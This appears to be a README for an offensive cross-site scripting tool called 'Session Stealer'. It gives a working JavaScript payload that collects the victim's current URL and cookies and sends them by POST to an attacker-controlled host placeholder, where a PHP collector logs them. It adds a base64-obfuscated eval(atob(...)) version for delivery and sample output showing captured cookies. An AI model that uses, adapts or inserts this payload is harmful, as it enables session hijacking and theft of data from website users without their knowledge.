# Session Stealer (Cross-site Scripting)

Using the JavaScript payload found below will result in a XHR POST request containing the current URL (including variables) and Cookie(s) (if available).

The `data.php` file will create or append the data received to `output.txt`.

Data can be read directly from `output.txt` or using the included `output.php` file to process a cleaner output.



## JavaScript Payload

```
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "https://<host>/data.php", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var data = "URL: " + window.location.href
if (document.cookie.length > 0) { data = data + " - Cookie(s): " + document.cookie; }
xhttp.send("data=" + btoa(data));
```

Payloads are often easier to deliver when encoded:

```
eval(atob("<base64_encoded_payload>"));
```
```
eval(atob("dmFyIHhodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CnhodHRwLm9wZW4oIlBPU1QiLCAiaHR0cHM6Ly88aG9zdD4vZGF0YS5waHAiLCB0cnVlKTsKeGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp2YXIgZGF0YSA9ICJVUkw6ICIgKyB3aW5kb3cubG9jYXRpb24uaHJlZgppZiAoZG9jdW1lbnQuY29va2llLmxlbmd0aCA+IDApIHsgZGF0YSA9IGRhdGEgKyAiIC0gQ29va2llKHMpOiAiICsgZG9jdW1lbnQuY29va2llOyB9CnhodHRwLnNlbmQoImRhdGE9IiArIGJ0b2EoZGF0YSkpOw=="));
```

## Output (via output.php)
```
Wed, 22 Jan 2020 19:45:10 +0000 - 216.58.204.142 - URL: https://www.youtube.com/watch?v=dQw4w9WgXcQ - Cookie(s): GPS=1; CONSENT=WP.282c94; dkv=a429137dbfccc284af4358caae87b369e3QEAAAAdGxpcGkVfCheMA==
```
